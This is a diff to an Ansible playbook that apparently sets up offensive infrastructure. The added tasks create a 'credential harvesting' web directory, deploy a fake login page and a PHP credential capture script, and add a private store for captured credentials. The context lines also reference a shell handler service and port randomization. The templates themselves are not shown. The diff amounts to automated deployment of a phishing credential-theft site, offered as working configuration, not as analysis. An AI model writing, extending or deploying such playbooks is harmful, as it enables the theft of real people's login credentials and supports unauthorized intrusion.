@@ -129,6 +129,9 @@
     owner: www-data
     group: www-data
 
+- name: Include traffic flow configuration
+  include_tasks: "../tasks/traffic_flow_config.yml"
+
 # Run port randomization if enabled
 - name: Run port randomization if enabled
   include_tasks: port_randomization.yml
@@ -166,6 +169,45 @@
     mode: '0644'
     owner: root
     group: root
+
+- name: Create credential harvesting directory
+  file:
+    path: /var/www/login
+    state: directory
+    mode: '0755'
+    owner: www-data
+    group: www-data
+
+# Create secure storage outside web root
+- name: Create secure credential storage
+  file:
+    path: /var/private/creds
+    state: directory
+    mode: '0700'  # Only owner access
+    owner: www-data
+    group: www-data
+
+- name: Deploy credential harvesting page
+  template:
+    src: "../templates/fake-login.html.j2"
+    dest: "/var/www/login/auth.html"
+    mode: '0644'
+    owner: www-data
+    group: www-data
+
+- name: Deploy credential capture script
+  template:
+    src: "../templates/capture.php.j2"
+    dest: "/var/www/login/process.php"
+    mode: '0644'
+    owner: www-data
+    group: www-data
+
+- name: Install PHP for credential processing
+  apt:
+    name: php-fpm
+    state: present
+    update_cache: yes    
 
 - name: Start and enable shell handler service
   systemd:
